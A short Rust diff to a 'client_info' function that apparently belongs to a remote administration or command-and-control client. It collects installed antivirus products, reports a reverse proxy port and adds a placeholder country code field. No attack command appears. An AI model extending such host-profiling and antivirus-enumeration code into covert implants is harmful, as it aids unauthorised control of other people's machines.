@@ -80,6 +80,8 @@ pub fn client_info(group: String) -> ClientInfo{
     s.refresh_cpu_all();
 
     let installed_avs = get_installed_avs();
+    
+    // No blocking calls in this function - we'll fetch location asynchronously later if needed
 
     let client_data = ClientInfo {
         uuidv4: None,
@@ -97,6 +99,7 @@ pub fn client_info(group: String) -> ClientInfo{
         reverse_proxy_port: "".to_string(),
         installed_avs,
         disconnected: None,
+        country_code: "N/A".to_string(),
     };
 
     client_data
